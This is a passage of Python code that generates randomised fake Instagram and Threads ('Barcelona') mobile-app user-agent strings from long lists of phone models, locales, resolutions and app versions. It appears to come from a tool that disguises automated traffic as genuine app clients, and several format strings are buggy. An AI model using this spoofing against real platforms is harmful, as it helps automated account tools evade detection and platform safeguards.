		inf = random.choice(['Infinix F98', 'Infinix G636', 'Infinix X507', 'Infinix X507', 'Infinix Hot 10', 'Infinix X682B', 'Infinix X682C', 'Infinix X682B', 'Infinix X682C', 'MZ-Infinix X688C', 'Infinix X688B', 'Infinix X688C', 'Infinix X688B', 'Infinix X659B', 'Infinix PR652B', 'Infinix PR652B', 'Infinix X658E', 'Infinix PR652C', 'Infinix X689B', 'Infinix X689D', 'Infinix X689D', 'Infinix X689C', 'Infinix X662', 'Infinix X689F', 'MZ-Infinix X662B', 'Infinix X675', 'Infinix X675', 'Infinix X6812B', 'Infinix X6817', 'Infinix X6817B', 'Infinix X6816C', 'Infinix X6816', 'Infinix X6816D', 'Infinix X6816D', 'Infinix X668', 'Infinix X668C', 'Infinix X665B', 'Infinix X665', 'Infinix X665B', 'Infinix X510', 'Infinix X510', 'Infinix X6826B', 'Infinix X6826C', 'Infinix X6826B', 'Infinix X666B', 'Infinix X6825', 'Infinix X665E', 'Infinix X665C', 'Infinix X6827', 'Infinix X6827', 'Infinix HOT 3', 'Infinix HOT 3 LTE', 'Infinix-X554', 'Infinix HOT 3 Pro', 'Infinix X6831', 'Infinix X669', 'Infinix X669C', 'Infinix X669D', 'Infinix HOT 4', 'Infinix HOT 4 Lite', 'Infinix HOT 4 Pro', 'Infinix_X556_LTE', 'Infinix X559C', 'Infinix X559C', 'Infinix X559F', 'Infinix X559C', 'Infinix X606B', 'Infinix X606D', 'Infinix X606D', 'Infinix X606C', 'Infinix X608', 'Infinix X623', 'Infinix X624B', 'ar_AE Infinix X624', 'fr_FR Infinix X624', 'Infinix X625B', 'Infinix X625C', 'Infinix X625C', 'Infinix X625D', 'Infinix X650C', 'Infinix X650D', 'Infinix X650B', 'Infinix X650', 'Infinix X650C Flow', 'Infinix X650B', 'Infinix X650B', 'Infinix X650D', 'Infinix X655C', 'Infinix X655C', 'Infinix X655D', 'Infinix X680B', 'Infinix X655F', 'INFINIX-X551', 'Infinix-X551', 'Infinix-X551', 'INFINIX-X551', 'INFINIX-X551', 'Infinix_X521S', 'Infinix-X521', 'Infinix_X521_LTE', 'Infinix HOT S', 'Infinix-X521', 'Infinix_X521', 'Infinix X573', 'Infinix X573', 'Infinix X573B', 'Infinix X622', 'Infinix X622', 'Infinix Hot V3', 'Infinix HOT4 LTE', 'Infinix X693', 'Infinix X693', 'Infinix X695', 'Infinix X695C', 'Infinix X695D', 'MZ-Infinix X695C', 'Infinix X663', 'Infinix X663B', 'Infinix X697', 'Infinix X697', 'Infinix X698', 'Infinix X698', 'Infinix X670', 'Infinix X670', 'Infinix X676C', 'Infinix X663D', 'Infinix X676B', 'Infinix X671B', 'Infinix X672', 'Infinix X6819', 'Infinix X6819', 'Infinix X6819', 'Infinix X677', 'Infinix X677', 'Infinix-X600-LTE', 'Infinix NOTE 2', 'Infinix-X600-LTE', 'Infinix NOTE 2 LTE', 'Infinix NOTE 3', 'Infinix_X601_LTE', 'Infinix NOTE 3', 'Infinix NOTE 3 Pro', 'Infinix NOTE 3 Pro', 'Infinix X572', 'Infinix X572-LTE', 'Infinix X572', 'Infinix X572', 'Infinix X571', 'Infinix X604', 'Infinix X604B', 'Infinix X605', 'Infinix X610B', 'Infinix X610B', 'Infinix X610B', 'Infinix X690', 'Infinix X690B', 'Infinix X690B', 'Infinix X656', 'Infinix X656', 'Infinix X692', 'Infinix X692', 'Infinix X683B', 'Infinix X450', 'Infinix X5010', 'Infinix X5010', 'Infinix X401', 'Infinix S2', 'Infinix S2 Pro', 'Infinix S2 Pro', 'Infinix X626B', 'Infinix X626B', 'Infinix X626', 'Infinix X626B', 'Infinix X652A', 'Infinix X652', 'Infinix X652', 'Infinix X652A', 'Infinix X652A', 'Infinix X652B', 'Infinix X652C', 'Infinix X660C', 'Infinix X660C', 'Infinix X660B', 'Infinix X660C', 'Infinix X5515F', 'Infinix X5515I', 'Infinix X609', 'fr_MA Infinix X609', 'Infinix X5514D', 'Infinix X5516B', 'Infinix X5516C', 'Infinix X627', 'Infinix X627', 'Infinix X627', 'Infinix X653C', 'Infinix X680', 'Infinix X653', 'ar_AE Infinix X680', 'ar_AE Infinix X653', 'Infinix X680D', 'Infinix X657', 'Infinix X657B', 'Infinix X657C', 'Infinix X657', 'Infinix X657B', 'Infinix X6511', 'Infinix X6511B', 'Infinix X6511E', 'Infinix X6512', 'Infinix X6823', 'Infinix X6823C', 'Infinix X6823B', 'Infinix X6515', 'Infinix X6516', 'Infinix X6517', 'Infinix X612B', 'Infinix X503', 'Infinix X511', 'Infinix X352', 'Infinix X351', 'Infinix X351', 'Infinix X530', 'Infinix X530', 'Infinix X6711', 'Infinix X6716', 'Infinix X678B', 'Infinix Y88', 'Infinix X509', 'Infinix X6821', 'Infinix X6821', 'Infinix-X552', 'Infinix Zero 3', 'Infinix Zero 3', 'Infinix Zero 4', 'Infinix Zero 4 Plus', 'Infinix Zero 4 Plus', 'Infinix X603', 'Infinix X603-LTE', 'Infinix X6815C', 'Infinix X6815D', 'Infinix X6815B', 'Infinix X6815D', 'Infinix X6815C', 'Infinix X620B', 'Infinix X620', 'Infinix X620', 'Infinix X687', 'Infinix X687', 'Infinix X687', 'Infinix X687B', 'Infinix X6820', 'Infinix X6811B', 'Infinix X6811B', 'Infinix X6810', 'Infinix X6810'])
		viv = random.choice(['vivo 1002T', 'Vivo 1605', 'vivo 1730', 'vivo 1809', 'vivo_1820', 'vivo 1835', 'vivo 1914', 'vivo 2010', 'vivo 2019', 'vivo 2019', 'vivo 2019', 'vivo 2023', 'vivo 2027', 'vivo 3969', 'VIVO 5', 'Vivo 6', 'Vivo 7 Pro', 'Vivo 8', 'Vivo 93K Prime', 'vivo A5 ', 'vivo a54', 'Vivo A54', 'vivo a57', 'Vivo A87', 'VIVO A94', 'VIVO AIR', 'VIVO C8818', 'vivo E1', 'vivo E3', 'vivo E3', 'vivo E5', 'Vivo EGO', 'V1962BA', 'vivo h5', 'V1824A', 'V1824A', 'V1824BA', 'V2217A', 'V2217A', 'V2218A', 'V2218A', 'V2218A', 'V2243A', 'V1955A', 'I1927', 'I1928', 'V2024A', 'V2025A', 'V2025A', 'V2049A', 'V2049A', 'I2009', 'I2012', 'I2012', 'V2136A', 'V2136A', 'V2141A', 'V2171A', 'I2017', 'V2172A', 'V2172A', 'I2022', 'I2019', 'I2019', 'I2201', 'V1914A', 'V1914A', 'V1981A', 'V2055A', 'V2118A', 'V2157A', 'V2157A', 'V2154A', 'V2196A', 'V2196A', 'V2199A', 'V2231A', 'V2238A', 'V1936AL', 'V1936A', 'V1922A', 'V1922A', 'V1922A ', 'V1916A', 'V2023A', 'V2023A', 'VIVO V2023A', 'V2065A', 'V2061A', 'V2061A', 'V2143A', 'V2106A', 'V2165A', 'V2165A', 'V2180GA', 'V1986A', 'V2012A', 'V2012A', 'V2073A', 'V2073A', 'I2011', 'V2148A', 'I2018', 'V1919A', 'V2131A', 'V2220A', 'I2202', 'I2206', 'I2203', 'I2202', 'I2127', 'I2202', 'I2208', 'I2208', 'I2126', 'I2126', 'I2126', 'V2164KA', 'V2164KA', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'Vivo J5', 'vivo 1805', 'vivo 1805', 'vivo NEX', 'V1923A', 'vivo 1912', 'V1923A', 'vivo 1912', 'vivo 1913', 'V1924A', 'V1924A', 'vivo 1913', 'V1950A', 'V1950A', 'vivo NEX A', 'vivo NEX A', 'vivo 1813', 'V1821A', 'V1821A', 'vivo NEX S', 'vivo NEX S', 'Vivo ONE', 'Vivo ONE', 'PA2170', 'vivo PD1628F_EX', 'vivo PD1709', 'vivo PD1709F_EX', 'vivo PD1709F_EX', 'vivo PD1728', 'vivo PD1728', 'vivo PD1832F_EX', 'vivo PD2046F_EX', 'vivo PD2050F_EX', 'vivo PD2055F_EX', 'vivo PD2059F_EX', 'Vivo S', 'V1831A', 'V1831A', 'VIVO S1', 'Vivo S1 Prime', 'V1832A', 'V1832T', 'V2121A', 'V2121A', 'V2130A', 'V2130A', 'Vivo S11', 'Vivo S11 ', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S12', 'V2162A', 'Vivo S13', 'V2203A', 'V2207A', 'V2190A', 'V2244A', 'vivo S1Pro', 'Vivo S20 ', 'Vivo S21 ', 'Vivo S31', 'Vivo S4', 'Vivo S40', 'Vivo S41 /MMB439M', 'V1932A', 'vivo S6', 'V1962A', 'vivo S6T', 'V2020CA', 'V2020A', 'Vivo S76', 'V2031EA', 'vivo S7i(t)', 'vivo S7i(t)', 'vivo S7i(t)', 'V2080A', 'vivo S7t', 'vivo_S7t', 'vivo S7t', 'S7t 5G', 'vivo S7w', 'vivo S8', 'vivo S9', 'vivo S9', 'vivo S9', 'V2072A', 'V2048A', 'vivo S9t', 'V2168', 'V2168', 'V2153', 'V2153', 'V2150', 'V2151', 'V2151', 'V2151', 'V2143', 'vivo TD1602_EX', 'vivo U1', 'vivo 1916', 'vivo 1916', 'vivo 1921', 'V1941A', 'V1941A', 'V1928A', 'vivo V1', 'vivo V1', 'vivo V10', 'Vivo V10', 'VIVO V11', 'Vivo V11', 'vivo 1804', 'vivo 1804', 'vivo 1806', 'vivo 1806', 'vivo v11pro', 'vivo 1819', 'vivo 1818', 'vivo 1818', 'vivo 1920', 'vivo 1919', 'vivo 1907', 'vivo 1907', 'vivo 1907_19', 'vivo 1910', 'vivo 1909', 'vivo 1910', 'vivo 1933', 'vivo 1933', 'vivo V1907', 'vivo v19neo', 'vivo V1Max', 'vivo V1Max', 'vivo V2', 'V2040', 'vivo 2018', 'vivo 2018', 'V2022', 'Vivo V20A', 'Vivo V20G', 'V2066', 'V2108', 'V2050', 'V2050', 'V2050', 'V2061', 'V2055', 'Vivo V21S', 'V2130', 'V2132A', 'V2116', 'V2115', 'V2116', 'V2116', 'V2126', 'V2126', 'V2228', 'V2228', 'V2158', 'V2158', 'V2202', 'V2202', 'V2201', 'V2246', 'V2230', 'V2230', 'V2237', 'vivo V3', 'vivo V3', 'vivo V3Max A', 'vivo V3Max L', 'vivo v30', 'vivo v31', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3M A', 'vivo V3M A', 'vivo V3MA', 'vivo_V3Max', 'vivo v45', 'vivo 1601', 'vivo V5', 'vivo 1609', 'vivo 1611', 'Vivo V51', 'Vivo V54', 'vivo 1612', 'vivo 1713', 'vivo V5S A', 'vivo 1718', 'vivo 1716', 'vivo Y79A', 'vivo Y79A', 'V2166BA', 'Vivo V8', 'vivo 1723', 'vivo V9 mini', 'vivo 1851', 'VIVO V9Pro', 'vivo 1851', 'vivo 1727', 'Vivo X', 'V2178A', 'V2229A', 'V2170A', 'V2170A', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5S', 'vivo Xplay5S', 'vivo Xplay6', 'vivo Xplay6L', 'vivo Xplay6', 'vivo Xplay6', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X1', 'vivo X1', 'vivo X1', 'vivo X1', 'Vivo X11', 'vivo X1S', 'vivo X1S', 'vivo X1S', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1W', 'vivo X1w', 'VIVO X2', 'VIVO X2', 'VIVO_X2', 'vivo X20', 'vivo X20A', 'vivo X20Plus A', 'vivo 1720', 'vivo X20Plus UD', 'vivo X20Plus UD', 'vivo X21', 'vivo X21A', 'vivo X21UD A', 'vivo X21i', 'vivo X21i A', 'vivo X21i', 'vivo X21i A ', 'V1814A', 'V1814T', 'V1814T', 'V1814A', 'V1809A', 'V1809A', 'V1816A', 'V1809T', 'V1816T', 'V1829A', 'V1838A', 'V1838T', 'V1829T', 'V1836A', 'V1836A', 'V1836T', 'vivo X27Pro', 'V1938CT', 'V1938T', 'V1938T', 'vivo X3F', 'vivo X3F', 'vivo X3F', 'vivo X3L', 'vivo X3L', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'Vivo X40', 'vivo X5L', 'vivo X5', 'vivo X5L', 'vivo X5Pro D', 'vivo X5Pro L', 'vivo X5Pro V', 'vivo X5Pro D', 'vivo X5Pro D', 'V2001A', 'V2001A', 'vivo 2004', 'vivo 2005', 'vivo 2005', 'V1937', 'vivo 1937', 'V1937', 'V1937', 'vivo 2006', 'vivo 2006', 'V2005A', 'V2011A', 'X50 Pro+', 'V1930', 'V1930', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X520L', 'vivo X5F', 'vivo X5M', 'vivo X5M', 'vivo X5M', 'vivo X5Max ', 'vivo X5Max L', 'vivo X5Max L', 'vivo X5Max S', 'vivo X5Max V', 'vivo X5S L', 'vivo X5S L', 'vivo X5V', 'vivo X5V', 'vivo X5V', 'vivo X6D', 'vivo X6A', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus L', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus D', 'vivo X6Plus L', 'V2046A', 'V2059A', 'V2046A', 'V2045', 'V2046', 'V2047A', 'V2056A', 'V2085A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus A', 'vivo X7L', 'vivo X7Plus', 'vivo X7Plus', 'V2133A', 'V2104', 'V2104', 'V2105', 'V2134A', 'V2105', 'V2145A', 'V2114', 'V2145A', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'V2144', 'V2183A', 'V2144', 'V2208', 'V2185A', 'V2145', 'V2185A', 'Vivo X83', 'vivo X9', 'vivo X9L', 'vivo X9', 'vivo X9', 'vivo X9Plus', 'vivo X9Plus L', 'V2241A', 'V2242A', 'V2242A', 'V2227A', 'vivo X9i', 'vivo X9i', 'vivo X9i', 'vivo X9s', 'vivo X9s L', 'vivo X9s Plus', 'vivo X9s Plus', 'vivo X9s Plus L', 'vivo X9s Plus', 'VIVO XL', 'vivo Xplay', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'V2203', 'V2221', 'Vivo y1', 'Vivo Y1', 'V2168A', 'V2168A', 'vivo 1906', 'V2028', 'vivo Y11t', 'vivo Y11t', 'vivo Y11t', 'vivo 1904', 'V2163A', 'V2102', 'V2102', 'vivo 2007', 'vivo 2007', 'Vivo Y12I Pro', 'V2026', 'V2042', 'V2033', 'V2039', 'V2069', 'V2026_21', 'vivo Y13L', 'vivo Y13', 'vivo Y13L', 'vivo Y13L', 'vivo Y13i', 'vivo_Y13i', 'vivo Y13iL', 'vivo Y13iL', 'vivo Y13T', 'vivo Y13T', 'vivo 1901', 'vivo Y15T', 'vivo Y15T', 'V2134', 'V2147', 'V2147', 'V2212', 'V2120', 'V2204', 'V2214', 'V2204', 'vivo 1902', 'vivo 1902_19', 'VIVO 1902', 'vivo Y17T', 'vivo Y17T', 'vivo_Y17T', 'vivo Y17T', 'vivo Y17W', 'vivo Y17W', 'vivo Y17W', 'vivo Y18L', 'vivo Y18L', 'vivo Y18L', 'vivo 1915', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'Vivo Y1i', 'vivo 2015', 'vivo 2015', 'V2029', 'V2027', 'V2043_21', 'V2101', 'V2070', 'V2054', 'V2052', 'V2037', 'V2032', 'V2038', 'V2038', 'V2129', 'V2129', 'V2111', 'V2149', 'V2140', 'V2140', 'V2152', 'V2152', 'V2110', 'V2110', 'V2131', 'V2135', 'V2207', 'vivo Y22iL', 'vivo Y22iL', 'V2206', 'V2206', 'vivo Y23L', 'vivo Y23L', 'vivo y23l', 'vivo Y23L', 'vivo Y23L', 'vivo Y23L', 'vivo 1613', 'vivo Y27', 'vivo Y27L', 'vivo Y27', 'vivo Y28', 'vivo Y28', 'vivo Y28L', 'vivo Y28L', 'vivo Y29L', 'vivo Y29L', 'vivo Y29L', 'V1901A', 'V1901A', 'V1901A', 'V1901T', 'V1930A', 'vivo 1938', 'V2034A', 'V2036A', 'V2099A', 'V2099A', 'V2160', 'V2160', 'V2160', 'V2066BA', 'V2066A', 'Y30g', 'Vivo Y30S', 'vivo Y31L', 'V2068', 'V2054A', 'V2068A', 'V2068', 'V2158A', 'Vivo Y32', 'V2180A', 'V2057', 'V2109', 'V2166A', 'V2166A', 'V2146', 'V2205', 'V2205', 'vivo Y37A', 'vivo Y37', 'V2044', 'vivo Y3t', 'vivo Y3t', 'vivo Y3t', 'vivo y41', 'vivo Y5 ', 'Vivo Y5', 'vivo 1935', 'VIVO Y50(2021)', 'V2023EA', 'Y50t', 'V2035', 'vivo Y51L', 'vivo Y51A', 'V2030', 'vivo 1707', 'V2031_21', 'vivo Y51t L', 'vivo Y51t L', 'vivo Y51t L', 'V2053', 'V2057A', 'vivo Y53', 'vivo 1606A', 'vivo Y53n', 'V2058', 'V2123A', 'V2069A', 'V2045A', 'V2045A', 'vivo Y55A', 'V2127', 'V2127', 'vivo 1603', 'vivo Y55n', 'vivo 1610', 'V2164A', 'V2164A', 'V1934A', 'V2006', 'vivo Y613', 'vivo Y613', 'vivo Y613F', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y623', 'vivo Y623', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y628', 'vivo Y628', 'vivo 1719', 'vivo Y66', 'vivo Y66L', 'vivo Y66i A', 'vivo Y67', 'vivo Y67A', 'vivo Y67L', 'vivo Y685', 'vivo 1714', 'vivo Y69A', 'V2002A', 'V2002A', 'vivo Y71A', 'vivo 1724', 'vivo Y71A', 'vivo 1801', 'V2041', 'V2060', 'V2102A', 'V1731CA', 'vivo Y73', 'Vivo Y73 /MMB239M', 'V2059', 'V2031A', 'V2164PA', 'V2117', 'vivo Y75A', 'V2142', 'V2142', 'vivo Y75s', 'vivo Y75s', 'vivo Y75S', 'vivo Y75s', 'V2124', 'V2156A', 'V2219A', 'V2219A', 'V2169', 'V2169', 'V1913A', 'vivo 1808i', 'vivo 1803', 'vivo 1803', 'vivo 1812', 'vivo Y81S', 'V1732A', 'V1732T', 'vivo Y83A', 'vivo 1802', 'vivo Y83A', 'vivo Y83A', 'vivo 1726', 'Vivo Y83I', 'vivo Y85A', 'vivo Y85', 'Vivo Y85i', 'Vivo Y86', 'V1730EA', 'vivo v1730ea', 'vivo 1908', 'vivo 1823', 'vivo 1908_19', 'vivo 1817', 'vivo 1811', 'vivo Y913', 'vivo Y913', 'vivo Y91C', 'vivo 1820', 'vivo 1816', 'vivo Y923', 'vivo Y923', 'vivo Y927', 'vivo Y927', 'vivo Y928', 'vivo Y928', 'vivo Y928', 'vivo 1814', 'V1818A', 'V1818A', 'vivo 1814', 'vivo Y937', 'vivo Y937', 'vivo Y937', 'V1818CT', 'V1818CA', 'vivo 1807', 'vivo Y95', 'V1813A', 'V1813T', 'V1813A', 'vivo Y97', 'V1945A', 'V1801A0', 'vivo Z1', 'vivo 1918', 'vivo 1951', 'vivo 1951', 'VIVO Z1Pro', 'vivo 1918', 'vivo 1918 Flow', 'Vivo Z10', 'vivo Z1i', 'V1730DA', 'V1730DT', 'vivo Z1i', 'vivo_1951', 'vivo 1917', 'V1813BA', 'V1813BT', 'V1813BT', 'Vivo Z34', 'vivo Z3x', 'V1730GA', 'vivo Z3x', 'vivo Z3x', 'V1921A', 'V1911A', 'V1911A', 'V1911A', 'V1990A', 'V1990A', 'V1963A', 'V1963A'])
		rr = random.randint;rc = random.choice;dpis = random.choice(["240dpi", "480dpi", "320dpi", "440dpi", "640dpi","133dpi","320dpi","515dpi","160dpi","640dpi","240dpi","120dpi","800dpi","480dpi","225dpi","768dpi","216dpi","1024dpi","213dpi","450dpi"]);basa =rc(['en_US','en_GB','id_ID','in_ID','de_DE','ru_RU','en_SG','fr_FR','fa_IR','ja_JP','pt_BR','cs_CZ','zh_HK','zh_CN','vi_VN','en_PH','en_IN','tr_TR','it_IT']);pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688","1080x1920","720x1280","1080x2076","1440x2768","1440x2368"]);akhir = rr(399993134,444761830);com=rc(["qcom","mt6833","mt6765","mt8168"]);ver = rr(18,25);si = rr(72,120);versi=self.vers();andro=rc([f"30/{rr(4,23)}",f"31/{rr(4,13)}",f"29/{rr(4,13)}"]);xiaomi=rc(['M2004J19C','Redmi Note 9S','M2101K7AG','cepheus','Redmi Note 9 Pro','Redmi Note 8 Pro','220333QL','M2101K7BG','M2006C3MG','M2012K11G'])
		motorola = random.choice(['MOT-A6020l37', 'MotoA953', 'XT603', 'XT682', 'MB865', 'MB865', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'Motorola Defy', 'XT320', 'MOT-XT320', 'XT557', 'XT556', 'XT555C', 'Droid', 'Momodesign MD Droid', 'Droid', 'DROID2', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID3', 'XT894', 'DROID4', 'DROID4', 'DROID4 4G', 'Droid4X-WIN', 'Droid4X-WIN', 'DROID BIONIC', 'DROID BIONIC', 'DROID BIONIC 4G', 'DroidBox', 'XT1565', 'XT1030', 'XT1030', 'DroidPC Dual Core', 'DROID Pro', 'XT610', 'XT910', 'DROID RAZR', 'MOT-XT910S', 'XT910', 'DROID RAZR', 'XT910', 'MOT-XT910', 'DROID RAZR HD', 'XT910', 'DROID RAZR 4G', 'XT918', 'XT916', 'XT914', 'XT915', 'XT916', 'XT920', 'XT919', 'XT919', 'XT920', 'DROID RAZR HD', 'XT925', 'DROID RAZR HD', 'XT926', 'XT890', 'XT890', 'XT890', 'XT890', 'XT907', 'XT907', 'XT905', 'XT907', 'XT907', 'XT912', 'XT886', 'XT885', 'DROID RJ', 'XT1254', 'XT1254', 'XT1585', 'XT1080', 'XT1080', 'XT1080', 'Droid V3.0', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROID X2', 'DROID X2', 'Motorola E7 POWER', 'motorola edge', 'Motorola Edge S', 'motorola edge (2021)', 'motorola edge (2022', 'motorola edge (2022)', 'motorola edge 20', 'XT2153-1', 'motorola edge 20 pro', 'motorola edge 20 pro', 'motorola edge 30', 'motorola edge 30 neo', 'motorola edge 30 pro', 'motorola edge 40', 'motorola edge 40 pro', 'motorola edge plus', 'motorola edge plus', 'XT2125-4', 'xt2125-4', 'XT2175-2', 'XT2175-2', 'XT2201-2', 'XT2201-2', 'XT2201-2', 'XT881', 'XT901'])
		buatdevice = random.choice([inf,op,viv,xiaomi,motorola])
		apple = random.choice(['Apple iPhone 12', 'Apple iPhone 13', 'Apple iPhone SE', 'Apple iPhone X', 'Apple iPhone 11 Pro'])
		samsung = random.choice(['Samsung Galaxy S21', 'Samsung Galaxy A52', 'Samsung Galaxy A72', 'Samsung Galaxy M32', 'Samsung Galaxy Note 20'])
	#	xiaomi = random.choice(['Xiaomi Redmi Note 10', 'Xiaomi Redmi 9', 'Xiaomi Mi 11', 'Xiaomi Poco X3', 'Xiaomi Mi 10T'])
		oppo = random.choice(['Oppo Reno 6', 'Oppo A54', 'Oppo A74', 'Oppo F19 Pro', 'Oppo Find X3'])
		realme = random.choice(['Realme 8', 'Realme Narzo 30', 'Realme C25', 'Realme 7 Pro', 'Realme X7 Max'])
		huawei = random.choice(['Huawei P30', 'Huawei P40', 'Huawei Nova 7i', 'Huawei Y9 Prime', 'Huawei Mate 40 Pro'])
		oneplus = random.choice(['OnePlus 9', 'OnePlus 8T', 'OnePlus Nord 2', 'OnePlus Nord CE', 'OnePlus 7T'])
		google = random.choice(['Google Pixel 5', 'Google Pixel 4a', 'Google Pixel 6'])
		sony = random.choice(['Sony Xperia 1', 'Sony Xperia 5', 'Sony Xperia 10', 'Sony Xperia L4', 'Sony Xperia 5 II'])
		lenovo = random.choice(['Lenovo K12', 'Lenovo Legion Duel', 'Lenovo Z6 Pro', 'Lenovo K6 Note', 'Lenovo Z5 Pro'])
		asus = random.choice(['Asus ROG Phone 5', 'Asus Zenfone 8', 'Asus Zenfone 7', 'Asus ROG Phone 3', 'Asus Zenfone 6'])
		tecno = random.choice(['Tecno Camon 16', 'Tecno Spark 7', 'Tecno Phantom X', 'Tecno Pova 2', 'Tecno Pop 5'])
		honor = random.choice(['Honor 50', 'Honor Magic 3', 'Honor X20', 'Honor Play 5', 'Honor 9X Pro'])
		zte = random.choice(['ZTE Axon 30', 'ZTE Blade V30', 'ZTE Nubia Red Magic 6', 'ZTE Axon 20', 'ZTE Blade A7'])
		alcatel = random.choice(['Alcatel 3L', 'Alcatel 1S', 'Alcatel 1V', 'Alcatel 3X', 'Alcatel 5V'])
		lg = random.choice(['LG Wing', 'LG Velvet', 'LG V60 ThinQ', 'LG G8X ThinQ', 'LG K92 5G'])
		mod=rc(['galahad','curtana','sunny','cepheus','joyeuse','begonia','wind','secret','angelica','raphael','vili','taoyao','ginkgo','renoir','haydn'])
		iphones = f"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS {apple}; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)"
		tecnoo = f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; TCL; {tecno}; {tecno}; {com}; {basa}; {akhir})"
		ztee = f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; ZTE; ZTE {zte}; {zte}; {com}; pt_PT; {akhir})"
		alcatell = f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; ALCATEL/TCL; {alcatel}; {alcatel}; {com}; {basa}; {akhir})"
		honorr = f"Instagram {andro} Android ({andro}; {dpis}; {pxl}; HUAWEI/HONOR; {honor}; {honor}; {com}; {basa}; {akhir})"
		inv = rc([f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; INFINIX MOBILITY LIMITED/Infinix; {inf}; {inf}; {com}; {basa}; {akhir})"])
		vivo = f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; vivo; {viv}; {viv}; {com}; ru_RU; 388829083)"
		xiaomis = rc([f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/xiaomi; {xiaomi}; mido; {com}; {basa}); {akhir})"])
		bar_iphones = f"Barcelona 37.0.0.9.96 (iPhone7,2; iOS {apple}; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)"
		bar_tecnoo = f"Barcelona {versi} Android ({andro}; {dpis}; {pxl}; TCL; {tecno}; {tecno}; {com}; {basa}; {akhir})"
		bar_ztee = f"Barcelona {versi} Android ({andro}; {dpis}; {pxl}; ZTE; ZTE {zte}; {zte}; {com}; pt_PT; {akhir})"
		bar_alcatell = f"Barcelona {versi} Android ({andro}; {dpis}; {pxl}; ALCATEL/TCL; {alcatel}; {alcatel}; {com}; {basa}; {akhir})"
		bar_honorr = f"Barcelona {andro} Android ({andro}; {dpis}; {pxl}; HUAWEI/HONOR; {honor}; {honor}; {com}; {basa}; {akhir})"
		bar_inv = rc([f"Barcelona {versi} Android ({andro}; {dpis}; {pxl}; INFINIX MOBILITY LIMITED/Infinix; {inf}; {inf}; {com}; {basa}; {akhir})"])
		bar_vivo = f"Barcelona {versi} Android ({andro}; {dpis}; {pxl}; vivo; {viv}; {viv}; {com}; ru_RU; 388829083)"
		bar_xiaomis = rc([f"Barcelona {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/xiaomi; {xiaomi}; mido; {com}; {basa}); {akhir})"])
		
	#	uaready=rc([])
		uaready=f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; OPPO; {op}; {mod}; {com}; {basa}; {akhir})"
		asulama=rc([uaready,bar_xiaomis,bar_vivo])
		return asulama
	def vers(self):
		igv=("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,49.0.0.15.89,48.0.0.15.98,47.0.0.16.96,46.0.0.15.96,45.0.0.17.93,44.0.0.9.93,43.0.0.10.97,42.0.0.19.95,41.0.0.13.92,40.0.0.14.95,39.0.0.19.93,38.0.0.13.95,37.0.0.21.97,36.0.0.13.91,35.0.0.20.96,34.0.0.12.93,33.0.0.11.92,32.0.0.16.94,31.0.0.10.94,30.0.0.12.95,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16